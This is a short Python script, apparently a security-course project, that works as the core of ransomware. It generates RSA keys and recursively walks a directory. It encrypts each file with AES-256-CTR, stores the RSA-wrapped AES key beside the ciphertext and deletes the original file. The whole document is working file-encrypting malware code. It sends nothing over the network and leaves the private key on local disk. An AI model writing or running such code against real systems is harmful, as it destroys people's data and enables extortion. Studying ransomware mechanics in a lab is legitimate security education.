import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

# Function to enerate RSA keys
def generate_rsa_keys():
    # Generating key, private_key, and public_key from RSA
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()

    # Writing private key to file
    with open('private.pem', 'wb') as priv_file:
        priv_file.write(private_key)

    # Writing public key to file
    with open('public.pem', 'wb') as pub_file:
        pub_file.write(public_key)

# Function to encrypt an inputted file
def encrypt_file(input_file):
    # Generate random AES key and nonce
    aes_key = get_random_bytes(32)  # AES-256 key
    nonce = get_random_bytes(8)     # 8-byte nonce

    # Encrypt the file with AES
    with open(input_file, 'rb') as file:
        file_data = file.read()

    cipher_aes = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
    encrypted_data = cipher_aes.encrypt(pad(file_data, AES.block_size))

    # Save the encrypted file
    with open(input_file + '.enc', 'wb') as file:
        file.write(encrypted_data)

    # Encrypt AES key with RSA public key
    with open('public.pem', 'rb') as public_file:
        public_key = RSA.import_key(public_file.read())

    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)

    # Writing key and nonce to file
    with open(input_file + '.key', 'wb') as key_file:
        key_file.write(encrypted_aes_key)
        key_file.write(nonce)

    print(f"File '{input_file}' has been encrypted and saved as '{input_file}.enc'.")

    # Remove the original file after encryption
    os.remove(input_file)

# Recursively encrypt files in a directory
def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

# Generate RSA keys
generate_rsa_keys()

# Encrypt the 'critical' directory
encrypt_directory('/Users/txsoc/OneDrive/csce_5550_project/critical')